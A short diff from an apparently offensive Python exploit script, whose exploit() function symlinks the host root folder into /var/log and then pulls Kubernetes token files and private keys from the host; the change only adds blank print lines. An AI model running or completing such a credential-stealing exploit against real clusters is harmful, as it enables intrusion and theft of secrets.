@@ -70,9 +70,11 @@ def exploit():
         print("[+] creating symlink to host root folder inside /var/log")
         attach_to_root()
         
+        print()
         print("[*] fetching token files from host")
         extract_kuberenetes_tokens()
-
+        
+        print()
         print("[*] fetching private key files from host")
         extract_private_keys()
     
